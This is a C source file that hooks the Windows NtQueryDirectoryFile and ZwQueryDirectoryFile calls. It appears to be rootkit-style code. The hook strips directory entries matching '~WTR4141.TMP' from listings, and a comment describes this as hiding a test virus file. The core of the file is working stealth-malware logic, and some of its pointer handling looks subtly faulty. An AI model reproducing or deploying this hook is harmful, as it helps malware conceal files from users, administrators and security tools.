#include <windows.h>
#include <ntsecapi.h>
#include <winbase.h>
#include <stdio.h>
//#include <winternl.h>

#include"NativeAPI_NTDLL.h"
#include "MyQueryDirectoryFile.h"

__pfnNtQueryDirectoryFile oldNtQueryDirectoryFile = NULL;

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

NTSTATUS
NTAPI
MyNtQueryDirectoryFile(
	IN HANDLE               FileHandle,
	IN HANDLE               Event OPTIONAL,
	IN PIO_APC_ROUTINE      ApcRoutine OPTIONAL,
	IN PVOID                ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK    IoStatusBlock,
	OUT PVOID               FileInformation,
	IN ULONG                Length,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN              ReturnSingleEntry,
	IN PUNICODE_STRING      FileName OPTIONAL,
	IN BOOLEAN              RestartScan)
{
	NTSTATUS nRet=0;
	OutputDebugString(L"hook NtQueryDirectoryFile");

	//if (true)
	//{

	//	return nRet;
	//}

	nRet = oldNtQueryDirectoryFile(
		FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		FileInformation,
		Length,
		FileInformationClass,
		ReturnSingleEntry,
		FileName,
		RestartScan
	);
	if (NT_SUCCESS(nRet) && FileInformationClass == 3)
	{
		OutputDebugString(L"start hide file");
		//PFILE_BOTH_DIR_INFORMATION pFileInfo;
		//PFILE_BOTH_DIR_INFORMATION pLastFileInfo;
		//STRING ansiFileName, ansiDirName, HideDirFile;
		//UNICODE_STRING uniFileName;
		//BOOLEAN bLastOne = FALSE;
		//pFileInfo = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
		//pLastFileInfo = NULL;
		//do
		//{
		//	bLastOne = !(pFileInfo->NextEntryOffset);
		//	RtlInitUnicodeString(&uniFileName, pFileInfo->FileName);
		//	RtlUnicodeStringToAnsiString(&ansiFileName, &uniFileName, TRUE);
		//	RtlUnicodeStringToAnsiString(&ansiDirName, &uniFileName, TRUE);
		//	if (RtlCompareMemory(ansiFileName.Buffer, HideDirFile.Buffer, HideDirFile.Length) == HideDirFile.Length)
		//	{
		//		if (bLastOne)
		//		{
		//			pLastFileInfo->NextEntryOffset = 0;
		//			break;
		//		}
		//		else //指针往后移动
		//		{
		//			int iPos = ((ULONG)pFileInfo) - (ULONG)FileInformation;
		//			int iLeft = (DWORD)Length - iPos - pFileInfo->NextEntryOffset;
		//			RtlCopyMemory((PVOID)pFileInfo, (PVOID)((char*)pFileInfo + pFileInfo->NextEntryOffset), (DWORD)iLeft);
		//			continue;
		//		}
		//	}
		//	pLastFileInfo = pFileInfo;
		//	pFileInfo = (PFILE_BOTH_DIR_INFORMATION)((char*)pFileInfo + pFileInfo->NextEntryOffset);
		//}while (!bLastOne);
		//RtlFreeAnsiString(&ansiDirName);
		//RtlFreeAnsiString(&ansiFileName);
		PFILE_BOTH_DIR_INFORMATION pFileInfo;
		PFILE_BOTH_DIR_INFORMATION pLastFileInfo;
		//测试的C:\\下的virus.exe的隐藏
		WCHAR VIRUS[] = L"~WTR4141.TMP";
		BOOLEAN flag;
		pFileInfo = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
		pLastFileInfo = NULL;
		do
		{
			flag = !(pFileInfo->NextEntryOffset);
			//宽字符比较，暂用WCSSTR
			if (wcsstr(pFileInfo->FileName, VIRUS) != NULL)
			{
				if (flag)
				{
					pLastFileInfo->NextEntryOffset = 0;
					break;
				}
				else
				{
					int iPos = ((ULONG)pFileInfo) - (ULONG)FileInformation;
					int iLeft = (DWORD)Length - iPos - pFileInfo->NextEntryOffset;
					memcpy((PVOID)pFileInfo, (PVOID)((char*)pFileInfo + pFileInfo->NextEntryOffset), (DWORD)iLeft);
					continue;
				}
			}
			pLastFileInfo = pFileInfo;
			pFileInfo = (PFILE_BOTH_DIR_INFORMATION)((char*)pFileInfo + pFileInfo->NextEntryOffset);
		} while (!flag);
	}
//	goto  _FunctionRet;
//_FunctionRet:
return nRet;
}

__pfnZwQueryDirectoryFile oldZwQueryDirectoryFile = NULL;

NTSTATUS
NTAPI
MyZwQueryDirectoryFile(
	IN HANDLE               FileHandle,
	IN HANDLE               Event OPTIONAL,
	IN PIO_APC_ROUTINE      ApcRoutine OPTIONAL,
	IN PVOID                ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK    IoStatusBlock,
	OUT PVOID               FileInformation,
	IN ULONG                Length,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN              ReturnSingleEntry,
	IN PUNICODE_STRING      FileName OPTIONAL,
	IN BOOLEAN              RestartScan)
{
	NTSTATUS nRet=0;
	OutputDebugString(L"hook ZwQueryDirectoryFile");
	//if (true)
	//{

	//	return nRet;
	//}

	nRet = oldZwQueryDirectoryFile(
		FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		FileInformation,
		Length,
		FileInformationClass,
		ReturnSingleEntry,
		FileName,
		RestartScan
	);
	return nRet;
}